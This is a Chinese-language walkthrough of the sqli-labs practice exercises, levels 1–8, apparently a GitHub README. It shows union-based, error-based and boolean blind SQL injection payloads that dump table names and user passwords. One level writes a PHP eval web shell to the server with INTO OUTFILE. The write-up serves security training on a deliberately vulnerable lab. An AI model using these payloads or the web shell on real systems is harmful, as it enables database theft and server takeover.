# SQL-lab
sql注入全部解析

## 1. 先看题，要求输入一个数字

* 入乡随俗，试一试

![image](https://user-images.githubusercontent.com/76896357/114820853-429a7f80-9df2-11eb-8e69-c9e68400ed5d.png)

__很显然，会有回显__

* 接下来自由发挥，再输入一个2试试，又变了

![image](https://user-images.githubusercontent.com/76896357/114821024-84c3c100-9df2-11eb-8834-2cd998dc279e.png)

* 接下来，接下来试一试他的闭合方式

![image](https://user-images.githubusercontent.com/76896357/114821235-d409f180-9df2-11eb-8fbe-c14697352895.png)

__添加完单引号，根据报错的回显，发现他是单引号闭合方式，并且是字符型注入__

* 再看一下有几列，看看有哪几列可以回显

![image](https://user-images.githubusercontent.com/76896357/114821673-80e46e80-9df3-11eb-9d21-9c59ca3d3226.png)

**在这里我输入了六列进行联合查询，但是显示没有六列，那么就截一半**

![image](https://user-images.githubusercontent.com/76896357/114821812-b4bf9400-9df3-11eb-9986-d1e0bb9349bc.png)

**根据回显，我们发现，第二列和第三列是可以回显的**

> 现在我们就可以查到我们想要的内容

#### 查询数据库版本和库名称
```
-1' union select 1,version,database() --+//要让前边为错“-1”，不让数据库执行前边的语句
```

![image](https://user-images.githubusercontent.com/76896357/114821977-f9e3c600-9df3-11eb-95ca-17e5b48cce94.png)

#### 查询表名
```
-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+//group_concat,查询显示所有结果
```

![image](https://user-images.githubusercontent.com/76896357/114822963-690dea00-9df5-11eb-962c-c757254f70e4.png)

#### 查询列名
```
-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name=database() and table_name='users' --+
```

![image](https://user-images.githubusercontent.com/76896357/114823252-d6217f80-9df5-11eb-891e-32999a95568f.png)

#### 查询字段名
```
-1' union select 1,2,group_concat(password) from security.users --+
```

![image](https://user-images.githubusercontent.com/76896357/114823890-ad4dba00-9df6-11eb-85e1-6c065b1812ea.png)

第一关结束！！！


## 2. 数字型注入

* 查看下注入方式

![image](https://user-images.githubusercontent.com/76896357/114824492-8a6fd580-9df7-11eb-8d98-322e39c8b9b4.png)

很显然1没有被显示出来，那么就是数字型注入**那么不需要再数字的后面加上任何字符**

* 看下回显位

![image](https://user-images.githubusercontent.com/76896357/114825124-66f95a80-9df8-11eb-9679-eb91c77552e6.png)

* 查库
```
-1 union select 1,2,database() --+
```

![image](https://user-images.githubusercontent.com/76896357/114825614-07e81580-9df9-11eb-97f2-cc99c4a168ff.png)

从这里发现，之后的阶段和第一题几乎一样，除了1后面的‘。。。

不再赘述，下一题，

## 3.报错注入

* 查看注入方式
* ![image](https://user-images.githubusercontent.com/76896357/114825972-71682400-9df9-11eb-880f-b1b9def1e766.png)

在这里，可以看到，过滤的很严，看不出来是哪种方式闭合,但是可以发现，只有在输入‘的时候会报错，因此猜想是单引号的字符型注入

**然而当我再输入的时候查看回显位的时候，这才发现了他的闭合方式，原来是‘)**
```
-1') union select 1,2,3 --+
```
![image](https://user-images.githubusercontent.com/76896357/114826417-13880c00-9dfa-11eb-9720-a58460cfc5d2.png)

好了，现在知道闭合方式，那么继续查看回显

![image](https://user-images.githubusercontent.com/76896357/114826682-5cd85b80-9dfa-11eb-8aa5-8290364a0156.png)


剩下的步骤还是和第一关一样，只不过是把1‘换成1’)

![image](https://user-images.githubusercontent.com/76896357/114826920-a4f77e00-9dfa-11eb-9613-9d757b875fe4.png)

给个证明，不多做了

这一关过！！！！

## 4.”字符型注入

* 查看注入方式，输入1‘不行，1“报错

![image](https://user-images.githubusercontent.com/76896357/114827042-cb1d1e00-9dfa-11eb-82e8-3a47c7c01055.png)


根据报错显示这道题的闭合方式应该是“)

* 查询回显位
```
-1") union select 1,2,3 --+//前面一定要是错的
```

![image](https://user-images.githubusercontent.com/76896357/114827286-10d9e680-9dfb-11eb-9974-6690deabc7f8.png)

* 查库
```
-1") union select 1,2,database() --+
```

![image](https://user-images.githubusercontent.com/76896357/114827516-5d252680-9dfb-11eb-8f6d-1f136fe29b7d.png)

显然和第一关一样，不再赘述，过


## 5. 报错注入

* 在这里，继续查看他的闭合方式以及注入类型

```
-1' union select 1,2,3 --+
```

![image](https://user-images.githubusercontent.com/76896357/114827854-c442db00-9dfb-11eb-8a3d-c7972e860903.png)

通过报错发现，他的闭合方式是‘而且是字符型注入

* 查看他有没有回显
```
-1' union select 1,2,3 --+
```

![image](https://user-images.githubusercontent.com/76896357/114828080-0ff58480-9dfc-11eb-89f3-8165d4594b2c.png)

__完了，没有回显了，那么我们就想到报错注入__

```
-1' union select 1,2,3,4 --+
```

![image](https://user-images.githubusercontent.com/76896357/114828373-6662c300-9dfc-11eb-9b32-ac5d96f1faef.png)

__很显然他是会返回错误信息的__

因此套用报错注入的公式
```
?id=-1'union select count(*),1, concat('~',(select database()),'~',floor(rand()*2)) as a from information_schema.tables group by a--+
```

![image](https://user-images.githubusercontent.com/76896357/114830420-c195b500-9dfe-11eb-9751-5910d2262d7e.png)

* 查表：
```
?id=-1'union select count(*),1, concat('~',(select table_name from information_schema.tables where table_schema=database() limit 3,1),'~',floor(rand()*2)) as a from information_schema.tables group by a --+//同时带有随机性
```
![image](https://user-images.githubusercontent.com/76896357/114836284-12101100-9e05-11eb-8a85-450af27666ee.png)

* 查列：
```
?id=-1' union select count(*),1, concat('~',(select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 2,1),'~',floor(rand()*2)) as a from information_schema.tables group by a --+
```
![image](https://user-images.githubusercontent.com/76896357/114838451-4edd0780-9e07-11eb-8841-55c6c4a4e235.png)

* 查字段：
```
?id=-1' union select count(*),1, concat('~',(select password from security.users limit 1,1),'~',floor(rand()*2)) as a from information_schema.tables group by a --+
```

![image](https://user-images.githubusercontent.com/76896357/114838875-ba26d980-9e07-11eb-9917-1745abca7181.png)


**建议：背下公式，concat里面的内容是要修改的查询语句**//存在一定的概率问题，当出现YOU are in。。。时，多试几次

## 6. “报错注入

看到这就感觉和第五题应该差不多

* 查看他的闭合方式
```
?id=1') and 1=2 --+ //1=1时不会报错，1=2时报错
```
![image](https://user-images.githubusercontent.com/76896357/114840558-7fbe3c00-9e09-11eb-8126-f3ce73b2abfb.png)

可以看出他的闭合方式是双引号

* 其实在这里之前我先输如的是‘和” 发现’的时候会返回Yuo are in。。。“的时候发现没有回显，就可以知道他的闭合方式是”“

* 查库：
```
?id=-1'union select count(*),1, concat('~',(select database()),'~',floor(rand()*2)) as a from information_schema.tables group by a--+
```
![image](https://user-images.githubusercontent.com/76896357/114841918-edb73300-9e0a-11eb-9f3c-ba9ec6ae63df.png)

很显然这道题和第五题一样,不再赘述！！


## 7. 文件输出

一开始有些无脑，直接试了？ID=1

![image](https://user-images.githubusercontent.com/76896357/114842556-88177680-9e0b-11eb-9a43-396a2761a6bd.png)

很显然这里是要导出文件

测试他的闭合方式

![image](https://user-images.githubusercontent.com/76896357/114844810-bdbd5f00-9e0d-11eb-8a0b-57aaa8b71ceb.png)

再加上一个‘)就可以了

![image](https://user-images.githubusercontent.com/76896357/114844888-d2015c00-9e0d-11eb-91c0-89d14b82a8b6.png)

所以，闭合方式是‘））

# 直接写入
```
?id=-1')) union select 1,2,'<?php @eval($_POST["cmd"]);?>' into outfile "D:\\phpstudy_pro\\WWW\\q.php" --+
```
注意是否有写入文件的权限

之后用菜刀等链接

## 8.布尔单引号盲注

* 经判断，没有回显

* 查看闭合方式
```
?id=1'
```
![image](https://user-images.githubusercontent.com/76896357/114853505-6ff92480-9e16-11eb-9d8a-5a3ad5e2362f.png)

确定是‘的闭合方式

* 判断是不是报错注入
```
?id=1' union select 1,2,3,4 --+
```

* 很显然不是，而是bool盲注，只显示两种情况

因此，就用猜测的方法

```
?id=1' substr(database(),1,1)='s' --+
```
![image](https://user-images.githubusercontent.com/76896357/114854448-6ae8a500-9e17-11eb-8853-d312ff1d1238.png)

这里可以借助bp，进行爆破

还可以手工
类似于：

这样：
![image](https://user-images.githubusercontent.com/76896357/114857032-64a7f800-9e1a-11eb-9c08-2ab04a3e08f3.png)

先猜出database()的长度

再利用ascii码一个一个去猜，一般是利用bp爆破












































































